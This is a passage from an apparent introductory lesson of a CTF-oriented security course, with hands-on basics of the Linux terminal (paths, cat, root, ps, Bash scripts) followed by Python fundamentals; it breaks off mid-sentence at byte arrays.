&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# rm -r demo/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Desktop ghidra_9.1.2_PUBLIC peda %SystemDrive%
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Documents libc-database Pictures Templates
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Downloads Music Public Videos
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>All clean!&lt;/p>
&lt;h4 id="absolute-or-relative">Absolute or Relative?&lt;/h4>
&lt;p>There are two ways of expressing a file path: relative and absolute.
&lt;strong>Relative&lt;/strong> paths are called so because they refer to the current directoy.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# cd libc-database/
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This command uses a &lt;strong>relative&lt;/strong> path, as &lt;code>libc-database&lt;/code> only exists in &lt;code>/root&lt;/code> (&lt;code>~&lt;/code>).
If we were to run it from &lt;code>/bin&lt;/code> for instance, it wouldn&amp;rsquo;t work because there is no &lt;code>libc-datbase&lt;/code> directory in &lt;code>/bin&lt;/code>.&lt;/p>
&lt;p>&lt;strong>Absolute&lt;/strong> paths however can be used from anywhere in the filesystem.
They contain the full path to the file, starting from the root of the file system (&lt;code>/&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:/lib/x86_64-linux-gnu/security# cd /root/libc-database/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/libc-database# pwd
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">/root/libc-database
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the snippet above, we were able to navigate to &lt;code>/root/libc-database&lt;/code> from somewhere completely different in the hierarchy.&lt;/p>
&lt;p>Let&amp;rsquo;s get some practice:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Navigate to &lt;code>/usr/lib/dpkg/methods/apt/&lt;/code>, but don&amp;rsquo;t just copy and paste this path.
Use &lt;code>Tab&lt;/code> and you&amp;rsquo;ll barely have to type anything.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Now get back to &lt;code>root&lt;/code>&amp;rsquo;s home using the home directory shortcut.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Navigate to &lt;code>~/ghidra_9.1.2_PUBLIC/docs/images&lt;/code> using its absolute path.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Now move 2 levels up the hierarchy without retyping the path.
Use &lt;code>..&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="inspecting-file-contents">Inspecting File Contents&lt;/h4>
&lt;p>Up to this point, we&amp;rsquo;ve learned how to traverse the file system.
Now we need to be able to &lt;em>inspect&lt;/em> the files themselves.
The simplest ways to view the contents of a file in the terminal is the &lt;code>cat&lt;/code> command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# cat /etc/hostname
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">kali
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As you&amp;rsquo;ve probably guessed, &lt;code>/etc/hostname&lt;/code> is the file where the machine&amp;rsquo;s hostname is stored.&lt;/p>
&lt;p>Feel free to consult &lt;code>cat&lt;/code>&amp;rsquo;s man page for further details about the command.
We&amp;rsquo;ll introduce more advanced means of outputting the contents of a file in the session dedicated to &lt;a href="../data-representation">Data Representation&lt;/a>.
Stay tuned!&lt;/p>
&lt;h3 id="the-root-user">The Root User&lt;/h3>
&lt;p>As we said previously, the prompt may indicate the current user, in our case &lt;code>root&lt;/code>.
But what exactly is this user?
Well, Linux systems admit multiple levels of user privileges.
These privileges refer to the actions a certain user is allowed to perform, such as installing other apps or reading various files.&lt;/p>
&lt;p>But among all users, there is &lt;em>one to rule them all&lt;/em>: &lt;code>root&lt;/code>.
Similar to the &lt;code>Administrator&lt;/code> user in Windows, &lt;code>root&lt;/code> has no restrictions to the actions he may perform.
This is the default user in Kali Linux, so you don&amp;rsquo;t need to worry about permissions.
However, when logging into the remote servers we provide for some of the CTF challenges below, the user will be &lt;code>ctf&lt;/code> and it &lt;strong>does&lt;/strong> have limited permissions.&lt;/p>
&lt;h3 id="processes">Processes&lt;/h3>
&lt;p>Now that we&amp;rsquo;ve learned how to use the terminal, let&amp;rsquo;s take a look at the desktop.
A few common apps are pinned to the left taskbar.
Any application that is installed on a system is called a &lt;strong>program&lt;/strong>.
One such program is the web browser &lt;strong>Firefox&lt;/strong>
By clicking the Firefox icon, the &lt;strong>program&lt;/strong> starts to run.
Any running program is called a &lt;strong>process&lt;/strong>.&lt;/p>
&lt;p>Let&amp;rsquo;s test this by learning a new command.
With Firefox closed, run the command &lt;code>ps&lt;/code>.
Use &lt;code>man&lt;/code> to learn what it does.
If you use it as-is in the terminal, it displays two running processes: &lt;code>bash&lt;/code> and &lt;code>ps&lt;/code> itself:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ps
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic"> PID TTY TIME CMD
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic"> 1929 pts/0 00:00:00 bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic"> 3304 pts/0 00:00:00 ps
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>bash&lt;/code> stands for &lt;em>Bourne-Again Shell&lt;/em> and is the command interpreter used by the terminal.
In other words, it&amp;rsquo;s what reads your input and executes the commands you type.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>You already know what &lt;code>ps&lt;/code> is.
But why is it here?
You see, in order for &lt;code>ps&lt;/code> to start scanning for what processes are running, it needs to be running itself, which means it&amp;rsquo;s inevitable that it finds itself while scanning.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>Now open Firefox from the side bar and run &lt;code>ps&lt;/code> again:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ps
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic"> PID TTY TIME CMD
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic"> 1929 pts/0 00:00:00 bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic"> 3304 pts/0 00:00:00 ps
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Where is Firefox?
Well, when run without parameters, &lt;code>ps&lt;/code> displays the processes that are running &lt;strong>inside the current terminal&lt;/strong>, i.e. that have been started from this terminal.
Firefox was started from the GUI, so it has nothing to do with our terminal.
Use &lt;code>man&lt;/code> to learn how to list the &lt;strong>full&lt;/strong> output of &lt;strong>all&lt;/strong> processes in the system.&lt;/p>
&lt;p>Hopefully you haven&amp;rsquo;t cheated and did find the &lt;code>-A&lt;/code> (or &lt;code>-e&lt;/code>) and &lt;code>-f&lt;/code> options yourself.
Now the output is rather huge, but we only care about the final lines:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ps -A -f
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">[...]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root 3367 1612 50 15:54 ? 00:00:01 /usr/lib/firefox-esr/firefox-esr
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root 3444 3367 20 15:54 ? 00:00:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 1 -prefMapSize 183434 -parentBuildID 20200527211442 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/l
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root 3498 3367 14 15:54 ? 00:00:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 5670 -prefMapSize 183434 -parentBuildID 20200527211442 -greomni /usr/lib/firefox-esr/omni.ja -appomni /us
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root 3549 3367 35 15:54 ? 00:00:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 3 -isForBrowser -prefsLen 6402 -prefMapSize 183434 -parentBuildID 20200527211442 -greomni /usr/lib/firefox-esr/omni.ja -appomni /us
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root 3590 3367 10 15:54 ? 00:00:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 4 -isForBrowser -prefsLen 6402 -prefMapSize 183434 -parentBuildID 20200527211442 -greomni /usr/lib/firefox-esr/omni.ja -appomni /us
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root 3623 1929 0 15:54 pts/0 00:00:00 ps -A -f
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Great success!
We have seen Firefox move from being a simple program to being a running process.
In addition, we&amp;rsquo;ve learned a new command that is useful for inspecting what processes might be running on a system.
Once you hack into a remote system, you can use &lt;code>ps&lt;/code> to inspect what potentially exploitable processes are there.&lt;/p>
&lt;h3 id="scripts">Scripts&lt;/h3>
&lt;p>It is often convenient to group together a set of instructions so that you don&amp;rsquo;t have to type them separately each time you want to make use of their combined functionality.
For this purpose, you can use Bash scripts.
They are text files that simply contain Bash commands.
Bash is also a programming language that comes with &lt;code>if&lt;/code> statements, &lt;code>for&lt;/code> loops, functions and more, but we won&amp;rsquo;t be needing those right now.&lt;/p>
&lt;p>Bash scripts typically bear the extension &lt;code>.sh&lt;/code>, but this is by no means mandatory.
Take some time to take a look at and run the Bash script in &lt;code>activities/demo-bash/demo.sh&lt;/code>.
You can run it like so:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/essentials/welcome-to-linux/activities/demo-bash# sh demo.sh
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enter-python">Enter Python&lt;/h2>
&lt;h3 id="the-basics">The Basics&lt;/h3>
&lt;p>Python is a programming language designed with simplicty in mind.
It&amp;rsquo;s meant to be simple and fast to read, understand and write.
This is evident even from the language&amp;rsquo;s syntax.&lt;/p>
&lt;p>To get accustomed to Python, take a look at the code in the &lt;code>activities/demo-python&lt;/code> directory.
Feel free to fiddle with any of the code snippets.
Add your own, try things out and experiment!&lt;/p>
&lt;p>In order to run a Python script, just type the name of the script preceded by &lt;code>python3&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/essentials/welcome-to-linux/activities/demo-python# python3 variables.py
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="variables">Variables&lt;/h4>
&lt;p>Let&amp;rsquo;s start with &lt;a href="./activities/demo-python/variables.py">variables.py&lt;/a>.
This file explains how variables such as integers, floats and strings work in Python.
It also introduces the &lt;code>print&lt;/code> function.
Inspect and run the code.
Note that, unlike C code, in Python there is no need for a &lt;code>;&lt;/code> at the end of each line.&lt;/p>
&lt;h4 id="if-statements">If Statements&lt;/h4>
&lt;p>Now that we know how to create and print variables, let&amp;rsquo;s learn some more of the language&amp;rsquo;s syntax, starting with the &lt;code>if&lt;/code> keyword.
A typical &lt;code>if&lt;/code> statement looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000">condition&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># run some code&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that there are no &lt;code>{}&lt;/code>, like you would use in C.
This is because Python relies on &lt;strong>indentation&lt;/strong> to determine which instructions make up the body of the &lt;code>if&lt;/code> statement and which don&amp;rsquo;t.
Moreover, a colon (&lt;code>:&lt;/code>) needs to be used after every &lt;code>if&lt;/code>, &lt;code>for&lt;/code> or function declaration, as we&amp;rsquo;ll see shortly.
To make things clearer, check out and run the code in &lt;code>activities/demo-python/if.py&lt;/code>.&lt;/p>
&lt;p>As stated above, this code would not work because the &lt;code>print&lt;/code> instruction is not correctly indented and the &lt;code>if&lt;/code> statement appears to have no body:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000">a&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;This is an incorrect if statement. You will get an IndentationError.&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>But don&amp;rsquo;t take our word for granted.
Run this code too!&lt;/p>
&lt;h4 id="loops">Loops&lt;/h4>
&lt;p>Loops, be they &lt;code>for&lt;/code> or &lt;code>while&lt;/code> loops, use the same syntax as &lt;code>if&lt;/code> statements:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">for&lt;/span> &lt;span style="color:#000">var&lt;/span> &lt;span style="color:#204a87;font-weight:bold">in&lt;/span> &lt;span style="color:#000">set_of_objects&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># for body&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">while&lt;/span> &lt;span style="color:#000">condition&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># while body&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once again, note the usage of the &lt;code>:&lt;/code> after each loop declaration and the indentation of their bodies.&lt;/p>
&lt;p>The &lt;code>in&lt;/code> keyword present in the &lt;code>for&lt;/code> loop above signifies that the &lt;code>var&lt;/code> variable will act as an &lt;strong>iterator&lt;/strong>.
At every step of the loop, &lt;code>var&lt;/code> will be assigned to each consecutive element of the collection &lt;code>set_of_objects&lt;/code>.&lt;/p>
&lt;p>As before, take a look at, run and play with the code in &lt;code>activities/01-demo-python/loops.py&lt;/code> until you feel you get the hang of &lt;code>for&lt;/code>s and &lt;code>while&lt;/code>s.&lt;/p>
&lt;h4 id="functions">Functions&lt;/h4>
&lt;p>You&amp;rsquo;ve already seen the &lt;code>print&lt;/code>, &lt;code>range&lt;/code> and &lt;code>reversed&lt;/code> functions.
It is natural that we now try to create our own functions.
They follow the same syntax as before:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># As expected, the types of the parameters need not be specified.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># But you can do it if you want/need to.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">func&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">param1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">param2&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># function body&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also specify a &lt;strong>default&lt;/strong> value that a parameter can take when none is specified:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">foo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">param1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">param2&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">5&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># param2 defaults to 5 when not specified&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># function body&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Both of these function calls are correct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">foo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;whatever&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># Here param2 = 5, by default&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">foo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;whatever&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By now, you already know what to do.
The demo for Python functions is in &lt;code>activities/demo-python/functions.py&lt;/code>.
Go to town on it!&lt;/p>
&lt;h3 id="data-structures">Data Structures&lt;/h3>
&lt;p>Python comes equipped with built-in data structures, such as lists and dictionaries.&lt;/p>
&lt;h4 id="lists">Lists&lt;/h4>
&lt;p>Lists are indexed arrays that can store any type of data.
You can create a list by specifying its elements enclosed in &lt;code>[]&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">lst&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;some string&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87;font-weight:bold">True&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2.9&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Accessing the lists elements is similar to C: &lt;code>lst[0]&lt;/code>, &lt;code>lst[1]&lt;/code> and so on.
Yes, lists in Python are indexed from 0.&lt;/p>
&lt;p>Now go ahead and get some practice with lists by using the &lt;code>activities/demo-python/lists.py&lt;/code> script.&lt;/p>
&lt;h4 id="dictionaries">Dictionaries&lt;/h4>
&lt;p>Conceptually, dictionaries are mappings between a set of &lt;strong>keys&lt;/strong> and a set of &lt;strong>values&lt;/strong>.
This means that &lt;strong>each key&lt;/strong> is associated to &lt;strong>one value&lt;/strong>.
The opposite does not always hold true.
Thus, each &lt;strong>key&lt;/strong> in a dictionary is unique, but there is no such rule for &lt;strong>values&lt;/strong>.&lt;/p>
&lt;p>Let&amp;rsquo;s construct a dictionary and see what it does:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">my_dict&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;SSS&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Rullz&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;Essentials&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">10&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">True&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0.2&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">2.2&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">99&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As you can see, neither the keys, nor the values in a dictionary need to be of the same type.&lt;/p>
&lt;p>In order to access the value associated to a key, the syntax is the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">my_dict&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;SSS&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># Will print &amp;#34;Rullz&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="working-with-files">Working with Files&lt;/h3>
&lt;p>Reading input from and writing output to is essential for any programmer.
We&amp;rsquo;ll make heavy use of this feature in the future.&lt;/p>
&lt;p>The main function for interacting with files is &lt;code>open&lt;/code>.
Its simplified signature is the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">open&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">filename&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">mode&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;rt&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>filename&lt;/code> parameter is self-evident.
The &lt;code>mode&lt;/code> however, answers the question: &amp;ldquo;What do you want to do with this file?&amp;rdquo;
The &lt;code>mode&lt;/code> parameter is a string, where each character has its own meaning.
The list of the most common characters is specified in &lt;a href="https://docs.python.org/3/library/functions.html#open">Python&amp;rsquo;s official documentation&lt;/a>.&lt;/p>
&lt;p>Use &lt;a href="https://docs.python.org">https://docs.python.org&lt;/a> whenever you need to look up some of Python&amp;rsquo;s features.
For a quick intro into handling files in Python, consult the &lt;code>activities/demo-python/files.py&lt;/code> script.
Run it, and then check the contents of the &lt;code>output.txt&lt;/code> file it creates.&lt;/p>
&lt;h4 id="strings-or-bytes">Strings or Bytes?&lt;/h4>
&lt;p>In the previous section, we saw how we can read &lt;strong>strings&lt;/strong> from and write them to files.
However, the more frequent way of interacting with files is by using &lt;strong>byte arrays&lt;/strong>.&lt;/p>
&lt;p>&lt;strong>Byte arrays&lt;/strong> are very similar to strings, supporting nearly the same operations, but differ in representation.
While strings can also encode non-ASCII characters, such as &lt;code>ä&lt;/code>, or even emoji, bytes are restricted to ASCII characters.
For this reason, one letter in a byte array is exactly one byte in size, whereas a letter in a string could use more space, depending on its encoding.
As a result, the main reason they exist is to process data, regardless of encoding.
Network packet data, binary file contents, images are all to be processed as bytes, not as strings.&lt;/p>
&lt;p>You can create a byte array just like you would create a regular string &lt;strong>and adding a &lt;code>b&lt;/code> in front&lt;/strong>, like this:&lt;/p>
